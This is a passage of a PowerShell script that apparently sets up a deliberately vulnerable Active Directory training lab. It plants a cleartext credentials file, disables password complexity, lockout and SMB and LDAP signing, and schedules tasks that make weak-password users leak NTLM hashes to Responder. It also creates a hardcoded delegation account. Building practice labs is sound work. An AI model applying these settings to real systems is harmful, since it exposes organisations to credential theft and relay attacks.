        @{Path="$sharesPath\Finance_Reports\Payroll_Info.txt"; Content="Payroll Information`n`nPayroll Admin: payroll@$DomainName`nSystem: ADP`nFrequency: Bi-weekly"}
    )
    
    # Public share files
    $publicFiles = @(
        @{Path="$sharesPath\Public\Company_Policy.pdf"; Content="Company Policies and Procedures`n`n1. Code of Conduct`n2. IT Usage Policy`n3. Security Guidelines"},
        @{Path="$sharesPath\Public\Employee_Handbook.txt"; Content="Employee Handbook`n`nWelcome to the company!`nThis handbook contains important information."},
        @{Path="$sharesPath\Public\Training_Materials.zip"; Content="Training Materials Archive`n`nContains: Security training, HR policies, IT procedures"}
    )
    
    # HR_Files share files
    $hrFiles = @(
        @{Path="$sharesPath\HR_Files\Employee_Database.txt"; Content="Employee Database Export`n`nTotal Employees: 150`nActive: 145`nOn Leave: 5"},
        @{Path="$sharesPath\HR_Files\Benefits_Info.txt"; Content="Benefits Information`n`nHealth Insurance: BlueCross`n401k Provider: Fidelity`nVacation Days: 15/year"}
    )
    
    # Backup share files
    $backupFiles = @(
        @{Path="$sharesPath\Backup\backup_log.txt"; Content="Backup Log`n`nLast Backup: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')`nStatus: Success`nBackup Size: 50GB"},
        @{Path="$sharesPath\Backup\restore_procedures.txt"; Content="Restore Procedures`n`n1. Verify backup integrity`n2. Stop services`n3. Restore from backup`n4. Verify data"}
    )
    
    # Shared share files - VULNERABLE: Contains cleartext credentials for initial attack path
    $sharedFiles = @(
        @{Path="$sharesPath\Shared\notes.txt"; Content="Shared Notes`n`nThis folder contains shared documents for the team.`nPlease keep sensitive information secure."},
        @{Path="$sharesPath\Shared\credentials.txt"; Content="Backup Service Account Credentials`n`nUsername: backup_admin`nPassword: robert`nDomain: $DomainName`n`nNote: This account has backup operator privileges.`nUse for scheduled backup tasks.`n`nWARNING: This file should be moved to a secure location!"},
        @{Path="$sharesPath\Shared\backup_config.txt"; Content="Backup Configuration`n`nService Account: backup_admin`nBackup Schedule: Daily at 2:00 AM`nTarget: \\backup-server\backups`n`nCredentials stored in credentials.txt"},
        @{Path="$sharesPath\Shared\readme.txt"; Content="Shared Folder Readme`n`nThis is a shared folder accessible to all team members.`nPlease do not store sensitive information here.`n`nFor IT support, contact: it-support@$DomainName"}
    )
    
    $allFiles = $itFiles + $financeFiles + $publicFiles + $hrFiles + $backupFiles + $sharedFiles
    
    foreach ($file in $allFiles) {
        $file.Content | Out-File -FilePath $file.Path -Encoding UTF8 -Force
        Write-ColorOutput "  [+] Created file: $($file.Path)" "Green"
    }
    
    Write-ColorOutput "[+] Realistic files created" "Green"
}

# Function to disable password complexity requirements
function Disable-PasswordComplexity {
    Write-ColorOutput "[*] Disabling password complexity requirements..." "Yellow"
    
    try {
        # Get the default domain password policy
        $domain = Get-ADDomain
        
        # Disable password complexity
        Set-ADDefaultDomainPasswordPolicy -Identity $domain.DNSRoot `
            -ComplexityEnabled $false `
            -MinPasswordLength 1 `
            -PasswordHistoryCount 0 `
            -LockoutThreshold 0 `
            -LockoutDuration $null `
            -LockoutObservationWindow $null `
            -MinPasswordAge 0 `
            -MaxPasswordAge $null `
            -ErrorAction Stop
        
        Write-ColorOutput "  [+] Password complexity disabled" "Green"
        Write-ColorOutput "  [+] Minimum password length set to 1" "Green"
        Write-ColorOutput "  [+] Password history disabled" "Green"
        
        # Force Group Policy update
        gpupdate /force 2>$null | Out-Null
        Start-Sleep -Seconds 2
        Write-ColorOutput "  [+] Group Policy updated" "Green"
        
    } catch {
        Write-ColorOutput "  [!] Error disabling password complexity: $($_.Exception.Message)" "Red"
        Write-ColorOutput "  [*] Attempting alternative method via secedit..." "Yellow"
        
        # Alternative method using secedit
        try {
            $tempInf = "$env:TEMP\password_policy.inf"
            $tempDb = "$env:TEMP\password_policy.sdb"
            
            # Export current policy
            secedit /export /cfg $tempInf /areas SECURITYPOLICY 2>$null | Out-Null
            
            # Read and modify
            $content = Get-Content $tempInf -Raw
            $content = $content -replace "PasswordComplexity\s*=\s*1", "PasswordComplexity = 0"
            $content = $content -replace "MinimumPasswordLength\s*=\s*\d+", "MinimumPasswordLength = 1"
            $content = $content -replace "PasswordHistorySize\s*=\s*\d+", "PasswordHistorySize = 0"
            
            Set-Content -Path $tempInf -Value $content -Force
            
            # Apply the policy
            secedit /configure /db $tempDb /cfg $tempInf /areas SECURITYPOLICY 2>$null | Out-Null
            
            # Clean up
            Remove-Item $tempInf -Force -ErrorAction SilentlyContinue
            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            
            gpupdate /force 2>$null | Out-Null
            Write-ColorOutput "  [+] Password complexity disabled via secedit" "Green"
        } catch {
            Write-ColorOutput "  [!] Alternative method also failed: $($_.Exception.Message)" "Red"
        }
    }
    
    Write-ColorOutput "[+] Password complexity requirements disabled" "Green"
}

# Function to enable LLMNR/NBT-NS/mDNS for Responder testing
function Enable-ResponderProtocols {
    Write-ColorOutput "[*] Configuring LLMNR for Responder testing (NetBIOS disabled)..." "Yellow"

    # Enable LLMNR via registry (set to 1 or remove the restriction)
    $regPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name "EnableMulticast" -Value 1 -Type DWord
    Write-ColorOutput "  [+] LLMNR enabled via registry" "Green"

    # DISABLE NetBIOS over TCP/IP on all network adapters (force LLMNR usage)
    $adapters = Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
    foreach ($adapter in $adapters) {
        # SetTcpipNetbios: 0 = Default, 1 = Enable, 2 = Disable
        $result = $adapter.SetTcpipNetbios(2)
        if ($result.ReturnValue -eq 0) {
            Write-ColorOutput "  [+] NetBIOS DISABLED on adapter: $($adapter.Description) (forces LLMNR)" "Green"
        }
    }

    # Stop and disable NetBIOS Name Service to force LLMNR
    Stop-Service -Name "lmhosts" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "lmhosts" -StartupType Disabled -ErrorAction SilentlyContinue
    Write-ColorOutput "  [+] NetBIOS helper service disabled (LLMNR will be used instead)" "Green"

    # Ensure Windows Firewall allows LLMNR (UDP 5355) and mDNS (UDP 5353)
    # Note: NetBIOS is disabled, so only LLMNR/mDNS rules are needed
    New-NetFirewallRule -DisplayName "Allow LLMNR UDP Outbound" -Direction Outbound -Protocol UDP -LocalPort 5355 -Action Allow -ErrorAction SilentlyContinue | Out-Null
    New-NetFirewallRule -DisplayName "Allow LLMNR UDP Inbound" -Direction Inbound -Protocol UDP -LocalPort 5355 -Action Allow -ErrorAction SilentlyContinue | Out-Null
    New-NetFirewallRule -DisplayName "Allow mDNS UDP" -Direction Outbound -Protocol UDP -LocalPort 5353 -Action Allow -ErrorAction SilentlyContinue | Out-Null
    Write-ColorOutput "  [+] Firewall rules configured for LLMNR/mDNS" "Green"

    # Disable SMB signing to allow relay attacks
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 0 -Type DWord -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 0 -Type DWord -ErrorAction SilentlyContinue
    Write-ColorOutput "  [+] SMB signing disabled for relay attacks" "Green"

    Write-ColorOutput "[+] LLMNR enabled for Responder (NetBIOS disabled to force LLMNR usage)" "Green"
}

# Function to configure NTLM for responder/ntlmrelayx
function Enable-NTLMRelay {
    Write-ColorOutput "[*] Configuring NTLM for responder/ntlmrelayx..." "Yellow"
    
    # Ensure NTLM is enabled (usually is by default)
    # Configure LDAP signing requirements (relax for training)
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters"
    Set-ItemProperty -Path $regPath -Name "LDAPServerIntegrity" -Value 0 -Type DWord -ErrorAction SilentlyContinue
    
    # Disable SMB signing for easier relay attacks
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 0 -Type DWord -ErrorAction SilentlyContinue
    
    Write-ColorOutput "[+] NTLM configured for responder/ntlmrelayx" "Green"
}

# Function to manually test LLMNR/NBT-NS queries for a fake hostname
function Test-ResponderQuery {
    param(
        [Parameter(Mandatory=$false)]
        [string]$Hostname = "fileserver01"
    )
    
    Write-ColorOutput "[*] Testing LLMNR query for: $Hostname" "Yellow"
    Write-ColorOutput "[*] Note: NetBIOS is disabled, so only LLMNR will be used" "Cyan"
    Write-ColorOutput "[*] Watch your Responder window for queries..." "Cyan"
    Write-ColorOutput "" "White"
    
    # Clear DNS cache
    Write-ColorOutput "  [*] Clearing DNS cache..." "Cyan"
    ipconfig /flushdns | Out-Null
    
    # Test LLMNR with ping (NetBIOS is disabled, so LLMNR will be used)
    Write-ColorOutput "  [*] Testing LLMNR query (ping $Hostname)..." "Cyan"
    ping -n 1 -w 2000 $Hostname 2>&1 | Out-Null
    Start-Sleep -Seconds 1
    
    # Test SMB connection (will trigger LLMNR since NetBIOS is disabled)
    Write-ColorOutput "  [*] Testing SMB connection (dir \\$Hostname\share)..." "Cyan"
    dir \\$Hostname\share 2>&1 | Out-Null
    
    Write-ColorOutput "" "White"
    Write-ColorOutput "[+] Test complete! Check your Responder window for:" "Green"
    Write-ColorOutput "    - [LLMNR] Poisoned answer sent for name $Hostname" "White"
    Write-ColorOutput "    - [SMB] NTLMv2-SSP Client (if authentication occurred)" "White"
    Write-ColorOutput "    Note: NetBIOS is disabled, so only LLMNR queries will be sent" "Cyan"
    Write-ColorOutput "" "White"
}

# Function to start random Responder triggers via scheduled tasks
function Start-RandomResponderTriggers {
    param(
        [Parameter(Mandatory=$true)]
        [string]$AttackerIP
    )

    Write-ColorOutput "[*] Setting up scheduled tasks for Responder hash capture..." "Yellow"
    Write-ColorOutput "[*] Attacker IP (Responder Server): $AttackerIP" "Cyan"
    Write-ColorOutput "" "White"

    # Users and their passwords for authentication
    # These users will "simulate" trying to access fake network shares
    # Using usernames that are in xato-net-10-million-usernames.txt for better training
    # Passwords meet complexity requirements (uppercase, lowercase, number) but are still weak/crackable
    # Note: Removed admin, jane, test, john as they don't meet complexity requirements
    $userCredentials = @{
        "jsmith" = "Password1"
        "djones" = "Qwerty1"
        "sjohnson" = "Welcome1"
        "jgarcia" = "Abc123!"
        "crodriguez" = "Letmein1"
    }

    # Fake hostnames that DON'T exist - these will trigger LLMNR/NBT-NS resolution
    # Responder will poison these and capture the NTLM hashes
    $fakeHostnames = @(
        "fileserver01",
        "printserver",
        "sharepoint",
        "intranet",
        "backup-srv"
    )

    # Ensure fake hostnames are NOT in hosts file or DNS (so LLMNR/NBT-NS is used)
    Write-ColorOutput "[*] Step 0: Ensuring fake hostnames trigger LLMNR/NBT-NS..." "Yellow"
    $hostsFile = "$env:SystemRoot\System32\drivers\etc\hosts"
    $hostsContent = Get-Content $hostsFile -ErrorAction SilentlyContinue
    $modified = $false
    
    foreach ($fakeHost in $fakeHostnames) {
        # Remove any existing entries for fake hostnames from hosts file
        if ($hostsContent -match "^\s*[0-9.]+.*\s+$fakeHost\s*$") {
            $hostsContent = $hostsContent | Where-Object { $_ -notmatch "^\s*[0-9.]+.*\s+$fakeHost\s*$" }
            $modified = $true
            Write-ColorOutput "  [+] Removed $fakeHost from hosts file" "Green"
        }
    }
    
    if ($modified) {
        Set-Content -Path $hostsFile -Value $hostsContent -Force
        Write-ColorOutput "  [+] Hosts file updated - fake hostnames will trigger LLMNR/NBT-NS" "Green"
    } else {
        Write-ColorOutput "  [+] Fake hostnames not in hosts file (good - will use LLMNR/NBT-NS)" "Green"
    }
    
    # Clear DNS cache to ensure fresh queries
    ipconfig /flushdns | Out-Null
    Write-ColorOutput "  [+] DNS cache flushed" "Green"
    Write-ColorOutput "" "White"

    # Grant "Log on as batch job" rights to all users
    Write-ColorOutput "[*] Step 1: Granting 'Log on as batch job' rights to users..." "Yellow"

    $tempInf = "$env:TEMP\secedit_batch.inf"
    $tempDb = "$env:TEMP\secedit_batch.sdb"

    # Get current security policy
    secedit /export /cfg $tempInf /areas USER_RIGHTS 2>$null | Out-Null

    # Read the current file
    $content = Get-Content $tempInf -Raw

    # Build the user list for SeBatchLogonRight
    $domainName = (Get-ADDomain).NetBIOSName
    $userList = ($userCredentials.Keys | ForEach-Object { "$domainName\$_" }) -join ","

    # Check if SeBatchLogonRight exists and update it
    if ($content -match "SeBatchLogonRight\s*=\s*(.*)") {
        $currentUsers = $matches[1]
        $newValue = "$currentUsers,$userList"
        $content = $content -replace "SeBatchLogonRight\s*=\s*.*", "SeBatchLogonRight = $newValue"
    } else {
        # Add the right if it doesn't exist
        $content = $content -replace "(\[Privilege Rights\])", "`$1`r`nSeBatchLogonRight = $userList"
    }

    # Write the modified file
    Set-Content -Path $tempInf -Value $content

    # Apply the security policy
    secedit /configure /db $tempDb /cfg $tempInf /areas USER_RIGHTS 2>$null | Out-Null

    # Clean up temp files
    Remove-Item $tempInf -Force -ErrorAction SilentlyContinue
    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue

    Write-ColorOutput "  [+] Batch logon rights granted to all users" "Green"

    # Force Group Policy update to apply the batch logon rights immediately
    Write-ColorOutput "  [*] Applying policy changes..." "Cyan"
    gpupdate /force 2>$null | Out-Null
    Start-Sleep -Seconds 3
    Write-ColorOutput "  [+] Policy changes applied" "Green"

    # Remove any existing Responder tasks
    Write-ColorOutput "[*] Step 2: Cleaning up old scheduled tasks..." "Yellow"
    Get-ScheduledTask | Where-Object { $_.TaskName -like "ResponderTrigger_*" } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
    Write-ColorOutput "  [+] Old tasks removed" "Green"

    # Step 2.5: Verify and enable all users before creating tasks
    Write-ColorOutput "[*] Step 2.5: Verifying and enabling users for scheduled tasks..." "Yellow"
    foreach ($username in $userCredentials.Keys) {
        try {
            $user = Get-ADUser -Filter "SamAccountName -eq '$username'" -Properties LockedOut,Enabled -ErrorAction SilentlyContinue
            if ($user) {
                # Unlock account if locked
                if ($user.LockedOut) {
                    Unlock-ADAccount -Identity $username
                    Write-ColorOutput "  [+] Unlocked user: $username" "Green"
                }
                
                # Ensure user is enabled
                if (-not $user.Enabled) {
                    Enable-ADAccount -Identity $username
                    Write-ColorOutput "  [+] Enabled user: $username" "Green"
                }
                
                # Password should already be correct from user creation
                # We don't reset passwords here to avoid complexity requirement issues
                Write-ColorOutput "  [+] User $username verified (password set during creation)" "Green"
            } else {
                Write-ColorOutput "  [!] User $username not found - will skip scheduled task creation" "Yellow"
            }
        } catch {
            Write-ColorOutput "  [!] Error checking user $username : $($_.Exception.Message)" "Yellow"
        }
    }
    Write-ColorOutput "" "White"
    
    # Create scheduled tasks for each user
    Write-ColorOutput "[*] Step 3: Creating scheduled tasks for user simulation..." "Yellow"
    Write-ColorOutput "" "White"

    $taskCount = 0
    $totalUsers = $userCredentials.Count
    $hostnameIndex = 0

    foreach ($username in $userCredentials.Keys) {
        $password = $userCredentials[$username]
        $fullUsername = "$domainName\$username"
        
        # Verify user exists and is enabled before creating task
        try {
            $user = Get-ADUser -Filter "SamAccountName -eq '$username'" -ErrorAction SilentlyContinue
            if (-not $user) {
                Write-ColorOutput "  [-] Skipping task for $username - user not found" "Yellow"
                continue
            }
            if (-not $user.Enabled) {
                Write-ColorOutput "  [-] Skipping task for $username - user is disabled" "Yellow"
                continue
            }
        } catch {
            Write-ColorOutput "  [-] Skipping task for $username - error checking user: $($_.Exception.Message)" "Yellow"
            continue
        }

        # Each user tries to access a different fake hostname
        $fakeHost = $fakeHostnames[$hostnameIndex % $fakeHostnames.Count]
        $hostnameIndex++

        Write-ColorOutput "  [*] Creating task for $username -> \\$fakeHost\share" "Cyan"

        # Generate random interval (2-7 minutes) for continuous simulation
        $intervalMinutes = Get-Random -Minimum 2 -Maximum 8

        # Command to trigger LLMNR/NBT-NS query by accessing a fake share
        # The fake hostname doesn't exist, so Windows will broadcast LLMNR/NBT-NS queries
        # Responder will poison these and respond, triggering NTLM authentication
        # Note: Use single quotes for the outer string and escape properly for schtasks
        $taskName = "ResponderTrigger_$username"

        # Create a batch file for each user to avoid complex escaping issues
        $batchDir = "C:\Windows\Temp\ResponderTasks"
        if (-not (Test-Path $batchDir)) {
            New-Item -ItemType Directory -Path $batchDir -Force | Out-Null
        }

        $batchFile = "$batchDir\$taskName.bat"
        $logFile = "$batchDir\$taskName.log"
        $batchContent = @"
@echo off
REM This script forces LLMNR/NBT-NS broadcast queries for fake hostnames
REM Responder on Kali will intercept these broadcasts and capture NTLM hashes
REM Log file: $logFile

echo [%date% %time%] Starting Responder trigger for $fakeHost >> "$logFile"

REM Step 1: Clear DNS cache to prevent cached negative responses
ipconfig /flushdns >> "$logFile" 2>&1
echo [%date% %time%] DNS cache flushed >> "$logFile"

REM Step 2: Attempt NBT-NS query (NetBIOS is disabled, so this will fail and trigger LLMNR)
REM Note: NetBIOS is disabled, so this will fail and Windows will use LLMNR instead
echo [%date% %time%] Attempting NBT-NS query for $fakeHost (will fail, triggers LLMNR) >> "$logFile"
nbtstat -a $fakeHost >> "$logFile" 2>&1

REM Step 3: Use nslookup to force LLMNR query (if DNS fails, LLMNR is used)
echo [%date% %time%] Triggering LLMNR query for $fakeHost >> "$logFile"
nslookup $fakeHost >> "$logFile" 2>&1

REM Step 4: Small delay to ensure queries are sent
timeout /t 2 /nobreak >nul 2>&1

REM Step 5: Ping to trigger LLMNR (ping uses name resolution)
echo [%date% %time%] Pinging $fakeHost to trigger LLMNR >> "$logFile"
ping -n 1 -w 2000 $fakeHost >> "$logFile" 2>&1

REM Step 6: Force SMB connection attempts - these will trigger NTLM authentication
REM when Responder responds to the LLMNR queries (NetBIOS is disabled)
echo [%date% %time%] Attempting SMB connection to \\$fakeHost\share >> "$logFile"
dir \\$fakeHost\share >> "$logFile" 2>&1
dir \\$fakeHost\IPC$ >> "$logFile" 2>&1

REM Step 7: Try net use (another SMB trigger)
echo [%date% %time%] Attempting net use to \\$fakeHost\share >> "$logFile"
net use \\$fakeHost\share >> "$logFile" 2>&1
net use \\$fakeHost\share /delete /y >> "$logFile" 2>&1

REM Step 8: Try accessing with type command
type \\$fakeHost\share\test.txt >> "$logFile" 2>&1

REM Step 9: Use PowerShell to force SMB connection (another method)
powershell -Command "Get-ChildItem \\$fakeHost\share -ErrorAction SilentlyContinue" >> "$logFile" 2>&1

echo [%date% %time%] Completed Responder trigger for $fakeHost >> "$logFile"
exit /b 0
"@
        Set-Content -Path $batchFile -Value $batchContent -Force

        # Create the scheduled task to run AS THE DOMAIN USER (not SYSTEM)
        # This way, when the task runs, Windows will authenticate as that user
        # triggering NTLM authentication that Responder can capture
        # Using schtasks.exe for reliable credential handling
        try {
            # Calculate start time (1 minute from now)
            $startTime = (Get-Date).AddMinutes(1).ToString("HH:mm")
            
            # Build schtasks command - schtasks can run batch files directly
            # /sc minute = schedule type (minute)
            # /mo = repetition interval in minutes
            # /st = start time
            # /ru = run as user
            # /rp = password
            # /rl LIMITED = run level
            # /f = force (overwrite if exists)
            
            # Execute schtasks.exe with proper argument array (avoids quoting issues)
            # Note: schtasks requires the password to be provided, and the account must be enabled
            $result = & schtasks.exe /create /tn $taskName /tr $batchFile /sc minute /mo $intervalMinutes /st $startTime /ru $fullUsername /rp $password /rl LIMITED /f 2>&1
            $exitCode = $LASTEXITCODE
            if ($exitCode -ne 0) {
                $errorMsg = if ($result) { ($result | Out-String).Trim() } else { "Unknown error" }
                # Provide more helpful error messages
                if ($errorMsg -match "password is incorrect" -or $errorMsg -match "incorrect") {
                    throw "ERROR: The user name or password is incorrect. User: $username, Password: $password"
                } elseif ($errorMsg -match "disabled" -or $errorMsg -match "can't sign in") {
                    throw "ERROR: This user can't sign in because this account is currently disabled."
                } else {
                    throw "ERROR: $errorMsg"
                }
            }
            
            # Update task settings using PowerShell (schtasks doesn't support all settings)
            try {
                Get-ScheduledTask -TaskName $taskName -ErrorAction Stop | Out-Null
                $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
                Set-ScheduledTask -TaskName $taskName -Settings $settings -ErrorAction SilentlyContinue | Out-Null
            } catch {
                # Settings update is optional, continue if it fails
            }

            $taskCount++
            Write-ColorOutput "    [+] Task created: runs every $intervalMinutes minutes" "Green"
            Write-ColorOutput "        User: $username | Target: \\$fakeHost\share" "White"
        } catch {
            Write-ColorOutput "    [-] Failed to create task for $username" "Red"
            Write-ColorOutput "        Error: $($_.Exception.Message)" "Red"
        }
    }

    Write-ColorOutput "" "White"

    if ($taskCount -gt 0) {
        Write-ColorOutput "[+] Created $taskCount/$totalUsers scheduled tasks successfully" "Green"
        Write-ColorOutput "" "White"

        # Verify tasks were created and show their status
        Write-ColorOutput "[*] Step 4: Verifying scheduled tasks..." "Yellow"
        $allTasks = Get-ScheduledTask | Where-Object { $_.TaskName -like "ResponderTrigger_*" }
        foreach ($task in $allTasks) {
            $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName -ErrorAction SilentlyContinue
            $status = if ($taskInfo) { $taskInfo.LastRunTime.ToString("yyyy-MM-dd HH:mm:ss") } else { "Never run" }
            Write-ColorOutput "  [+] Task: $($task.TaskName) | Last Run: $status" "Cyan"
        }
        Write-ColorOutput "" "White"
        
        # Trigger all tasks immediately for testing
        Write-ColorOutput "[*] Step 5: Triggering immediate test runs..." "Yellow"
        foreach ($username in $userCredentials.Keys) {
            $taskName = "ResponderTrigger_$username"
            try {
                Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
                Write-ColorOutput "  [+] Triggered: $taskName" "Green"
            } catch {
                Write-ColorOutput "  [-] Failed to trigger: $taskName" "Red"
                Write-ColorOutput "      Error: $($_.Exception.Message)" "Red"
            }
            Start-Sleep -Seconds 2
        }
        
        Write-ColorOutput "" "White"
        Write-ColorOutput "[*] Step 6: Checking task execution logs..." "Yellow"
        $batchDir = "C:\Windows\Temp\ResponderTasks"
        foreach ($username in $userCredentials.Keys) {
            $logFile = "$batchDir\ResponderTrigger_$username.log"
            if (Test-Path $logFile) {
                $logSize = (Get-Item $logFile).Length
                $logTime = (Get-Item $logFile).LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                Write-ColorOutput "  [+] Log exists: $username.log ($logSize bytes, updated: $logTime)" "Green"
            } else {
                Write-ColorOutput "  [!] Log missing: $username.log (task may not have run yet)" "Yellow"
            }
        }

        Write-ColorOutput "" "White"
        Write-ColorOutput "========================================" "Magenta"
        Write-ColorOutput "  RESPONDER SETUP COMPLETE!" "Magenta"
        Write-ColorOutput "========================================" "Magenta"
        Write-ColorOutput "" "White"
        Write-ColorOutput "HOW IT WORKS:" "Yellow"
        Write-ColorOutput "  1. Scheduled tasks run as domain users and try to access fake shares" "White"
        Write-ColorOutput "     (e.g., \\fileserver01\share, \\printserver\share)" "White"
        Write-ColorOutput "  2. These hostnames DON'T exist in DNS or hosts file" "White"
        Write-ColorOutput "  3. NetBIOS is DISABLED, so Windows uses LLMNR (UDP 5355) for name resolution" "White"
        Write-ColorOutput "  4. Windows broadcasts LLMNR queries" "White"
        Write-ColorOutput "  5. Responder on Kali intercepts these BROADCAST queries" "White"
        Write-ColorOutput "  6. Responder poisons the response, claiming to be the fake server" "White"
        Write-ColorOutput "  7. Windows connects to Responder and sends NTLM authentication" "White"
        Write-ColorOutput "  8. Responder captures the NTLMv2 hash" "White"
        Write-ColorOutput "" "White"
        Write-ColorOutput "IMPORTANT - NETWORK REQUIREMENTS:" "Yellow"
        Write-ColorOutput "  - Kali machine MUST be on the same network/subnet as the DC" "White"
        Write-ColorOutput "  - LLMNR is a BROADCAST protocol (same subnet only)" "White"
        Write-ColorOutput "  - NetBIOS is disabled to force LLMNR usage" "White"
        Write-ColorOutput "  - If on different subnets, use a network bridge or VPN" "White"
        Write-ColorOutput "" "White"
        Write-ColorOutput "ON YOUR KALI MACHINE:" "Yellow"
        Write-ColorOutput "  sudo responder -I <interface> -v" "Cyan"
        Write-ColorOutput "  Example: sudo responder -I eth0 -v" "Cyan"
        Write-ColorOutput "  Or specify IP: sudo responder -I eth0 -v -b" "Cyan"
        Write-ColorOutput "" "White"
        Write-ColorOutput "TROUBLESHOOTING:" "Yellow"
        Write-ColorOutput "  If you're not seeing hashes:" "White"
        Write-ColorOutput "  1. Verify Responder is running: sudo responder -I <interface> -v" "White"
        Write-ColorOutput "  2. Check tasks are running: Get-ScheduledTask | Where-Object {`$_.TaskName -like 'ResponderTrigger_*'}" "White"
        Write-ColorOutput "  3. Manually test LLMNR: ping fileserver01 (should broadcast LLMNR query)" "White"
        Write-ColorOutput "  4. On Kali, verify LLMNR broadcasts are received:" "White"
        Write-ColorOutput "     sudo tcpdump -i <interface> udp port 5355" "Cyan"
        Write-ColorOutput "  5. Check firewall allows LLMNR (UDP 5355) traffic" "White"
        Write-ColorOutput "  6. Note: NetBIOS is disabled, so only LLMNR (UDP 5355) will be used" "White"
        Write-ColorOutput "  7. Verify network is on same subnet as Kali machine" "White"
        Write-ColorOutput "  8. Check Windows Event Viewer for task execution errors" "White"
        Write-ColorOutput "  9. Verify fake hostnames are NOT in DNS or hosts file" "White"
        Write-ColorOutput "  10. Try manually: dir \\fileserver01\share (as a domain user)" "White"
        Write-ColorOutput "" "White"
        Write-ColorOutput "MANUAL TEST COMMANDS:" "Yellow"
        Write-ColorOutput "  Quick test (run this now to verify queries are sent):" "White"
        Write-ColorOutput "    Test-ResponderQuery -Hostname fileserver01" "Cyan"
        Write-ColorOutput "" "White"
        Write-ColorOutput "  Test as a domain user (to trigger NTLM authentication):" "White"
        Write-ColorOutput "    runas /user:$domainName\jsmith cmd" "Cyan"
        Write-ColorOutput "    Then in that cmd: dir \\fileserver01\share" "Cyan"
        Write-ColorOutput "" "White"
        Write-ColorOutput "  Check task logs (to see if tasks are running):" "White"
        Write-ColorOutput "    Get-Content C:\Windows\Temp\ResponderTasks\ResponderTrigger_jsmith.log" "Cyan"
        Write-ColorOutput "" "White"
        Write-ColorOutput "  Check task status:" "White"
        Write-ColorOutput "    Get-ScheduledTask | Where-Object {`$_.TaskName -like 'ResponderTrigger_*'} | Get-ScheduledTaskInfo" "Cyan"
        Write-ColorOutput "" "White"
        Write-ColorOutput "USERS BEING SIMULATED:" "Yellow"
        Write-ColorOutput "  Note: All usernames match entries in xato-net-10-million-usernames.txt" "Cyan"
        $hostnameIndex = 0
        foreach ($username in $userCredentials.Keys) {
            $fakeHost = $fakeHostnames[$hostnameIndex % $fakeHostnames.Count]
            $hostnameIndex++
            Write-ColorOutput "  - $username -> \\$fakeHost\share (Password: $($userCredentials[$username]))" "White"
        }
        Write-ColorOutput "" "White"
        Write-ColorOutput "EXPECTED OUTPUT IN RESPONDER:" "Yellow"
        Write-ColorOutput "  [LLMNR] Poisoned answer sent to <DC IP> for name fileserver01" "White"
        Write-ColorOutput "  [SMB] NTLMv2-SSP Client   : <DC IP>" "White"
        Write-ColorOutput "  Note: NetBIOS is disabled, so only LLMNR queries will appear" "Cyan"
        Write-ColorOutput "  [SMB] NTLMv2-SSP Username : $domainName\jsmith" "White"
        Write-ColorOutput "  [SMB] NTLMv2-SSP Hash     : jsmith::<hash>" "White"
        Write-ColorOutput "" "White"
        Write-ColorOutput "IMMEDIATE TEST:" "Yellow"
        Write-ColorOutput "  Run this command NOW to test if queries are being sent:" "White"
        Write-ColorOutput "    Test-ResponderQuery -Hostname fileserver01" "Cyan"
        Write-ColorOutput "  Watch your Responder window - you should see:" "White"
        Write-ColorOutput "    [LLMNR] Poisoned answer sent for name fileserver01" "Cyan"
        Write-ColorOutput "" "White"
        Write-ColorOutput "The tasks will continue running at random intervals (2-7 minutes)" "Green"
        Write-ColorOutput "You should see hashes being captured continuously!" "Green"
    } else {
        Write-ColorOutput "[-] No tasks were created successfully" "Red"
        Write-ColorOutput "[*] You may need to run this function manually after Stage 2 completes" "Yellow"
    }
}

# ========================================
# STAGE 3: Advanced Vulnerable Attack Paths
# ========================================

# Function to configure unconstrained delegation
function Set-UnconstrainedDelegation {
    Write-ColorOutput "[*] Configuring unconstrained delegation..." "Yellow"
    
    $domainDN = (Get-ADDomain).DistinguishedName
    
    # Create a service account with unconstrained delegation
    $delegationUser = "svc_delegation"
    $serviceOU = "OU=ServiceAccounts,$domainDN"
    
    try {
        $existing = Get-ADUser -Filter "SamAccountName -eq '$delegationUser'" -ErrorAction SilentlyContinue
        if ($existing) {
            Set-ADAccountControl -Identity $delegationUser -TrustedForDelegation $true
            Write-ColorOutput "  [+] Updated $delegationUser with unconstrained delegation" "Green"
        } else {
            $securePassword = ConvertTo-SecureString "Delegation2024!" -AsPlainText -Force
            New-ADUser -Name $delegationUser `
                -SamAccountName $delegationUser `
                -UserPrincipalName "$delegationUser@$DomainName" `
                -Path $serviceOU `
                -AccountPassword $securePassword `
                -Enabled $true `
                -PasswordNeverExpires $true `
                -Description "Service account with unconstrained delegation" `
                -ErrorAction Stop
            
            Set-ADAccountControl -Identity $delegationUser -TrustedForDelegation $true
            Write-ColorOutput "  [+] Created $delegationUser with unconstrained delegation (Password: Delegation2024!)" "Green"
        }
    } catch {
        Write-ColorOutput "  [!] Error configuring unconstrained delegation: $($_.Exception.Message)" "Red"
    }
    
    Write-ColorOutput "[+] Unconstrained delegation configured" "Green"
}

# Function to configure constrained delegation
function Set-ConstrainedDelegation {
    Write-ColorOutput "[*] Configuring constrained delegation..." "Yellow"
    
    $domainDN = (Get-ADDomain).DistinguishedName
    $serviceOU = "OU=ServiceAccounts,$domainDN"
    
